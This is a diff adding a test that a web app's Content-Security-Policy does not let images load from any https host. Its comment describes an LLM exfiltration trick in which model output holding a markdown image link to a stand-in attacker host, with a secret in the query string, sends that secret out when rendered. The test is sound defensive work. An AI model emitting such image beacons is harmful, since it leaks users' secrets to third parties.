@@ -44,4 +44,14 @@ describe('Content-Security-Policy', () => {
     expect(contentSecurityPolicy).not.toContain('*;');
     expect(directive('connect-src')).not.toContain(' * ');
   });
+
+  it('does not auto-load images from an arbitrary host — no beacon channel', () => {
+    // A bare `https:` in img-src is the LLM exfiltration channel: model output
+    // ![](https://attacker/p?d=<secret>) fires a GET on render. img-src must
+    // name specific hosts, never the whole scheme.
+    const img = directive('img-src') ?? '';
+    // The bare scheme is a standalone token; `https://s3.hanzo.ai` is not it.
+    expect(img.split(' ')).not.toContain('https:');
+    expect(img).toContain("'self'");
+  });
 });
